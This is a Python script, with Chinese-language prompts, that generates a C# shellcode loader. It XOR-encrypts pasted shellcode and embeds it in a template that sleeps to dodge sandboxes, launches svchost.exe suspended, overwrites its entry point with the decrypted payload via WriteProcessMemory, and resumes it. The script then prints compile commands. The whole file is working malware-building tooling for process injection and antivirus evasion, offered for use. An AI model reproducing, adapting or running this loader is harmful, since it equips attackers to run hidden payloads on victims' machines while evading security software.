#!/usr/bin/env python3
import re
import os
import sys
from textwrap import dedent

def parse_shellcode():
    print("\n[+] 请粘贴Shellcode（支持多行格式：0x01,0x02... 或 \\x01\\x02...）")
    print("[!] 输入空行结束粘贴")
    lines = []
    while True:
        line = sys.stdin.readline().strip()
        if not line:
            break
        lines.append(line)
    data = ' '.join(lines)

    hex_values = []
    patterns = [
        (r'0x([0-9a-fA-F]{2})', 1),      # 0x格式
        (r'\\x([0-9a-fA-F]{2})', 1),     # \x格式
        (r'([0-9a-fA-F]{2})', 1)         # 原始hex
    ]

    for pattern, grp in patterns:
        matches = re.findall(pattern, data, re.IGNORECASE)
        if matches:
            hex_values = [f"0x{m.lower()}" for m in matches]
            break

    if not hex_values:
        raise ValueError("无法识别shellcode格式")

    return format_byte_array(hex_values)

def format_byte_array(hex_list):
    formatted = []
    for i in range(0, len(hex_list), 15):
        line = ', '.join(hex_list[i:i+15])
        formatted.append(line)
    return ',\n'.join(formatted)

def get_input(prompt, default, validator=None):
    while True:
        user_input = input(f"{prompt} (默认: {default}): ").strip()
        if not user_input:
            user_input = default
            
        if validator:
            try:
                validator(user_input)
            except ValueError as e:
                print(f"错误: {str(e)}")
                continue
                
        return user_input

def validate_key(key):
    try:
        key_int = int(key, 0)
        if not (0 <= key_int <= 255):
            raise ValueError("密钥必须在0x00-0xFF范围内")
    except ValueError:
        raise ValueError("无效的密钥格式（示例：255 或 0xff）")
    return True

def generate_code(encrypted_bytes, xor_key):
    template = f"""using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace SecureLoader
{{
    public class Program
    {{
        // 反沙箱配置
        private const int ANTI_SLEEP = 10000;
        private const double THRESHOLD = 9.5;

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION 
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO 
        {{
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {{
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }}

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            uint processInformationLength,
            out uint returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main()
        {{
            // 反沙箱检测
            DateTime t1 = DateTime.Now;
            Sleep(ANTI_SLEEP);
            if ((DateTime.Now - t1).TotalSeconds < THRESHOLD)
                return;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            try
            {{
                // 创建挂起进程
                if (!CreateProcess(
                    null,
                    @"C:\\Windows\\System32\\svchost.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0x00000004, // CREATE_SUSPENDED
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi))
                {{
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }}

                // 获取进程信息
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                uint retLen;
                int status = NtQueryInformationProcess(
                    pi.hProcess,
                    0,
                    ref pbi,
                    (uint)Marshal.SizeOf(pbi),
                    out retLen);

                if (status != 0)
                    throw new Win32Exception(status);

                // 计算PEB基址
                IntPtr pebOffset = (IntPtr)((long)pbi.PebBaseAddress + 0x10);
                byte[] addrBuf = new byte[8];
                IntPtr bytesRead;

                if (!ReadProcessMemory(pi.hProcess, pebOffset, addrBuf, addrBuf.Length, out bytesRead))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                IntPtr imageBase = (IntPtr)BitConverter.ToInt64(addrBuf, 0);

                // 读取PE头
                byte[] peHeader = new byte[0x200];
                if (!ReadProcessMemory(pi.hProcess, imageBase, peHeader, peHeader.Length, out bytesRead))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 验证PE签名
                if (peHeader[0] != 0x4D || peHeader[1] != 0x5A) // MZ
                    throw new ApplicationException("无效的PE文件");

                // 获取入口点
                uint e_lfanew = BitConverter.ToUInt32(peHeader, 0x3C);
                uint entryRva = BitConverter.ToUInt32(peHeader, (int)e_lfanew + 0x28);
                IntPtr entryPoint = (IntPtr)((long)imageBase + entryRva);

                // 处理payload
                byte[] buf = new byte[] {{
                    {encrypted_bytes}
                }};

                // XOR解密
                for (int i = 0; i < buf.Length; i++)
                {{
                    buf[i] = (byte)(buf[i] ^ 0x{xor_key:02x});
                }}

                // 写入payload
                IntPtr bytesWritten;
                if (!WriteProcessMemory(pi.hProcess, entryPoint, buf, buf.Length, out bytesWritten))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 恢复线程
                if (ResumeThread(pi.hThread) == 0xFFFFFFFF)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                Console.WriteLine("[+] 注入成功!");
            }}
            catch (Exception ex)
            {{
                Console.WriteLine("[!] 错误: {{0}}", ex.Message);
            }}
            finally
            {{
                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            }}
        }}
    }}
}}"""
    return dedent(template)

def main():
    print(r"""
    █▀█ █▀▀ █▀ ▀█▀ █▀█ █▀█   █░░ █▀█ █▀▀ █▀▀ ▀█▀ █▀█ █▀█
    █▀▄ ██▄ ▄█ ░█░ █▄█ █▀▄   █▄▄ █▄█ █▄▄ ██▄ ░█░ █▄█ █▀▄
    """)

    # 获取配置
    xor_key = get_input(
        "输入XOR密钥（0x00-0xFF）", 
        "0xfa",
        validate_key
    )
    xor_key = int(xor_key, 0) & 0xFF

    byte_str = parse_shellcode()

    # 加密处理
    encrypted_bytes = []
    for b in re.findall(r'0x([0-9a-fA-F]{2})', byte_str):
        original = int(b, 16)
        encrypted = original ^ xor_key
        encrypted_bytes.append(f"0x{encrypted:02x}")
    formatted_bytes = format_byte_array(encrypted_bytes)

    # 生成代码
    code = generate_code(formatted_bytes, xor_key)

    # 保存文件
    output_file = get_input(
        "输出文件名", 
        "Payload.cs",
        lambda x: x.endswith('.cs') or "必须为.cs文件"
    )

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(code)

    print(f"\n[+] 成功生成：{output_file}")
    print("[!] 编译命令：")
    print("     x86: csc /platform:x86 /unsafe /out:loader.exe Payload.cs")
    print("     x64: csc /platform:x64 /unsafe /out:loader.exe Payload.cs")

if __name__ == "__main__":
    main()